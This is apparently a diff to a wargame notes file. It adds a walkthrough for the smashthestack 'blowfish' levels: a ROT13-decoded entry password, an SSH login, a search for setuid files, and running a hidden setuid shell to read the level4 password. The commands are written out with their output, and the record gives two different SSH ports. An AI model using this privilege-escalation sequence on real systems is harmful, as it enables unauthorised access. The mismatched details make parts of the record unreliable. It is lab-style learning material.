@@ -5,6 +5,80 @@
  "port": 22,
  "status": "online (probed 2026-11-24 18:30Z: port 6666 telnet open, serves 'Encrypted Password is: GungJnfRnfl...'; port 22 SSH open, OpenSSH_5.3)",
  "note": "Added to scope 2026-11-24. Beginner game, 13 levels (level1..level13 per game page). Entry: telnet blowfish.smashthestack.org 6666 returns an ENCRYPTED password; decrypt it to get the level1->level2 login. SSH on port 22 as levelN. Passwords live in /pass; do testing in /code (per game MOTD) and clean up after. Level count: 13 (verify live).",
- "levels": [],
+ "levels": [
+  {
+   "lvl": 2,
+   "user": "level2",
+   "pw": "ThatWasEasy",
+   "steps": [
+    {
+     "cmd": "telnet blowfish.smashthestack.org 6666",
+     "out": [
+      "Encrypted Password is: GungJnfRnfl"
+     ]
+    },
+    {
+     "cmd": "echo GungJnfRnfl | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+     "out": [
+      "ThatWasEasy"
+     ]
+    },
+    {
+     "cmd": "ssh -p 2222 level2@blowfish.smashthestack.org",
+     "out": [
+      "(MOTD: READ READ READ)",
+      "level2@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "whoami",
+     "out": [
+      "level2"
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "There is a backdoor to the next level hidden somewhere on this system, find it, and get the pass for level3 from /pass/level3"
+     ]
+    },
+    {
+     "cmd": "find / -perm -4000 -type f 2>/dev/null",
+     "out": [
+      "/bin/su",
+      "/levels/level4",
+      "/levels/level5",
+      "...",
+      "/var/local/.      level4_backdoor"
+     ]
+    },
+    {
+     "cmd": "ls -la '/var/local/.      level4_backdoor'",
+     "out": [
+      "-rwsr-xr-x 1 level4 level3 11529 ... /var/local/.      level4_backdoor"
+     ]
+    },
+    {
+     "cmd": "'/var/local/.      level4_backdoor'",
+     "out": [
+      "sh-3.2$ "
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=1002(level2) gid=1002(level2) euid=1004(level4) groups=1002(level2)"
+     ]
+    },
+    {
+     "cmd": "cat /pass/level4",
+     "out": [
+      "n3xt_l3v3l!"
+     ]
+    }
+   ],
+   "note": "Entry: telnet 6666 -> ROT13. The level2 README's 'backdoor' is /var/local/.<spaces>level4_backdoor (setuid level4 /bin/sh wrapper). Running it gives euid level4 -> cat /pass/level4 -> level4 login. Level3 is skipped by design (the level3 backdoor copy in /var/opt lost its setuid bit server-side; /pass/level3 is level3-only readable). Verified live 2026-11-24."
+  }
+ ],
  "goals": {}
 }
